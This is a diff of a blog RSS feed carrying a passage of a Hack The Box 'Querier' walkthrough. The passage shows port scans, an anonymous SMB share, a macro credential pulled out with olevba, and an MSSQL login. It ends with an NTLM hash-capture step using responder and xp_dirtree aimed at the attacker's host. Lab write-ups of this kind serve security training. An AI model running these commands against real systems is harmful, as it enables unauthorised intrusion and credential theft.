@@ -1,1 +1,218 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Macros on Personal Blog</title><link>https://0x13hrafnulf.github.io/tags/macros/</link><description>Recent content in Macros on Personal Blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Wed, 06 Sep 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://0x13hrafnulf.github.io/tags/macros/index.xml" rel="self" type="application/rss+xml"/><item><title>[HTB] Machine: Querier</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/querier/</link><pubDate>Wed, 06 Sep 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/querier/</guid><description>Querier Enumeration nmap └─$ nmap -Pn -p- 10.10.10.125 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-07 03:05 BST Stats: 0:06:52 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 72.17% done; ETC: 03:15 (0:02:39 remaining) Nmap scan report for 10.10.10.125 (10.10.10.125) Host is up (0.15s latency). Not shown: 65521 closed tcp ports (conn-refused) PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 1433/tcp open ms-sql-s 5985/tcp open wsman 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49668/tcp open unknown 49669/tcp open unknown 49670/tcp open unknown 49671/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 693.</description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Macros on Personal Blog</title><link>https://0x13hrafnulf.github.io/tags/macros/</link><description>Recent content in Macros on Personal Blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Wed, 06 Sep 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://0x13hrafnulf.github.io/tags/macros/index.xml" rel="self" type="application/rss+xml"/><item><title>[HTB] Machine: Querier</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/querier/</link><pubDate>Wed, 06 Sep 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/querier/</guid><description>&lt;h1 id="querier">Querier&lt;/h1>
+&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;ul>
+&lt;li>&lt;code>nmap&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p- 10.10.10.125 -T4
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-07 03:05 BST
+Stats: 0:06:52 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 72.17% done; ETC: 03:15 (0:02:39 remaining)
+Nmap scan report for 10.10.10.125 (10.10.10.125)
+Host is up (0.15s latency).
+Not shown: 65521 closed tcp ports (conn-refused)
+PORT STATE SERVICE
+135/tcp open msrpc
+139/tcp open netbios-ssn
+445/tcp open microsoft-ds
+1433/tcp open ms-sql-s
+5985/tcp open wsman
+47001/tcp open winrm
+49664/tcp open unknown
+49665/tcp open unknown
+49666/tcp open unknown
+49667/tcp open unknown
+49668/tcp open unknown
+49669/tcp open unknown
+49670/tcp open unknown
+49671/tcp open unknown
+Nmap done: 1 IP address (1 host up) scanned in 693.11 seconds
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p135,139,445,1433,5985 -sC -sV 10.10.10.125 -T4
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-07 03:18 BST
+Nmap scan report for 10.10.10.125 (10.10.10.125)
+Host is up (0.13s latency).
+PORT STATE SERVICE VERSION
+135/tcp open msrpc Microsoft Windows RPC
+139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+445/tcp open microsoft-ds?
+1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
+| ms-sql-ntlm-info:
+| 10.10.10.125:1433:
+| Target_Name: HTB
+| NetBIOS_Domain_Name: HTB
+| NetBIOS_Computer_Name: QUERIER
+| DNS_Domain_Name: HTB.LOCAL
+| DNS_Computer_Name: QUERIER.HTB.LOCAL
+| DNS_Tree_Name: HTB.LOCAL
+|_ Product_Version: 10.0.17763
+| ms-sql-info:
+| 10.10.10.125:1433:
+| Version:
+| name: Microsoft SQL Server 2017 RTM
+| number: 14.00.1000.00
+| Product: Microsoft SQL Server 2017
+| Service pack level: RTM
+| Post-SP patches applied: false
+|_ TCP port: 1433
+|_ssl-date: 2023-09-06T19:18:33+00:00; -7h00m00s from scanner time.
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2023-09-06T14:05:43
+|_Not valid after: 2053-09-06T14:05:43
+5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+| smb2-time:
+| date: 2023-09-06T19:18:24
+|_ start_date: N/A
+|_clock-skew: mean: -7h00m00s, deviation: 0s, median: -7h00m00s
+| smb2-security-mode:
+| 3:1:1:
+|_ Message signing enabled but not required
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 22.61 seconds
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>smb&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ smbclient -N -L //10.10.10.125
+Sharename Type Comment
+--------- ---- -------
+ADMIN$ Disk Remote Admin
+C$ Disk Default share
+IPC$ IPC Remote IPC
+Reports Disk
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.10.125 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+&lt;/code>&lt;/pre>&lt;h2 id="footholduser-1">Foothold/User #1&lt;/h2>
+&lt;ul>
+&lt;li>&lt;code>//10.10.10.125/Reports&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ smbclient -N //10.10.10.125/Reports
+Try &amp;#34;help&amp;#34; to get a list of possible commands.
+smb: \&amp;gt; ls
+. D 0 Mon Jan 28 23:23:48 2019
+.. D 0 Mon Jan 28 23:23:48 2019
+Currency Volume Report.xlsm A 12229 Sun Jan 27 22:21:34 2019
+5158399 blocks of size 4096. 828878 blocks available
+smb: \&amp;gt; get &amp;#34;Currency Volume Report.xlsm&amp;#34;
+getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (23.7 KiloBytes/sec) (average 23.7 KiloBytes/sec)
+smb: \&amp;gt; exit
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>We can use &lt;a href="https://github.com/decalage2/oletools" target="_blank" rel="noopener">oletools&lt;/a> to open &lt;code>xlsm&lt;/code> file&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ olevba &amp;#39;Currency Volume Report.xlsm&amp;#39;
+XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
+olevba 0.60.1 on Python 3.11.4 - http://decalage.info/python/oletools
+===============================================================================
+FILE: Currency Volume Report.xlsm
+Type: OpenXML
+WARNING For now, VBA stomping cannot be detected for files in memory
+-------------------------------------------------------------------------------
+VBA MACRO ThisWorkbook.cls
+in file: xl/vbaProject.bin - OLE stream: &amp;#39;VBA/ThisWorkbook&amp;#39;
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+&amp;#39; macro to pull data for client volume reports
+&amp;#39;
+&amp;#39; further testing required
+Private Sub Connect()
+Dim conn As ADODB.Connection
+Dim rs As ADODB.Recordset
+Set conn = New ADODB.Connection
+conn.ConnectionString = &amp;#34;Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6&amp;#34;
+conn.ConnectionTimeout = 10
+conn.Open
+If conn.State = adStateOpen Then
+&amp;#39; MsgBox &amp;#34;connection successful&amp;#34;
+&amp;#39;Set rs = conn.Execute(&amp;#34;SELECT * @@version;&amp;#34;)
+Set rs = conn.Execute(&amp;#34;SELECT * FROM volume;&amp;#34;)
+Sheets(1).Range(&amp;#34;A1&amp;#34;).CopyFromRecordset rs
+rs.Close
+End If
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO Sheet1.cls
+in file: xl/vbaProject.bin - OLE stream: &amp;#39;VBA/Sheet1&amp;#39;
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+(empty macro)
++----------+--------------------+---------------------------------------------+
+|Type |Keyword |Description |
++----------+--------------------+---------------------------------------------+
+|Suspicious|Open |May open a file |
+|Suspicious|Hex Strings |Hex-encoded strings were detected, may be |
+| | |used to obfuscate strings (option --decode to|
+| | |see all) |
++----------+--------------------+---------------------------------------------+
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Let&amp;rsquo;s connect using &lt;code>impacket-mssqlclient&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ impacket-mssqlclient reporting:&amp;#39;PcwTWTHRwryjc$c6&amp;#39;@10.10.10.125 -windows-auth
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 32576
+[*] INFO(QUERIER): Line 1: Changed database context to &amp;#39;volume&amp;#39;.
+[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
+[!] Press help for extra shell commands
+SQL&amp;gt;
+&lt;/code>&lt;/pre>&lt;h2 id="user-2">User #2&lt;/h2>
+&lt;ul>
+&lt;li>Let&amp;rsquo;s enumerate
+&lt;ul>
+&lt;li>&lt;a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server" target="_blank" rel="noopener">https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>SQL&amp;gt; SELECT name FROM master.sys.databases;
+name
+--------------------------------------------------------------------------------------------------------------------------------
+master
+tempdb
+model
+msdb
+volume
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>SQL&amp;gt; use volume;
+[*] ENVCHANGE(DATABASE): Old Value: volume, New Value: volume
+[*] INFO(QUERIER): Line 1: Changed database context to &amp;#39;volume&amp;#39;.
+SQL&amp;gt; select * from volume.INFORMATION_SCHEMA.TABLES;
+TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE
+-------------------------------------------------------------------------------------------------------------------------------- -------------------------------------------------------------------------------------------------------------------------------- -------------------------------------------------------------------------------------------------------------------------------- ----------
+SQL&amp;gt;
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>SQL&amp;gt; select name from sys.database_principals;
+name
+--------------------------------------------------------------------------------------------------------------------------------
+public
+dbo
+guest
+INFORMATION_SCHEMA
+sys
+reporting
+db_owner
+db_accessadmin
+db_securityadmin
+db_ddladmin
+db_backupoperator
+db_datareader
+db_datawriter
+db_denydatareader
+db_denydatawriter
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>SQL&amp;gt; SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &amp;#39;SERVER&amp;#39;);
+entity_name permission_name
+-------------------------------------- ------------------------------------------------------------
+server CONNECT SQL
+server VIEW ANY DATABASE
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>We can try &lt;code>Relay attack&lt;/code> to steal &lt;code>NTLM&lt;/code>
+&lt;ul>
+&lt;li>&lt;a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server" target="_blank" rel="noopener">https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server&lt;/a>&lt;/li>
+&lt;li>Spawn &lt;code>responder&lt;/code>
+&lt;ul>
+&lt;li>&lt;code>sudo responder -I tun0&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;code>xp_dirtree '\\10.10.16.9\share'&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/querier/images/1.png">&lt;/p></description></item></channel></rss>
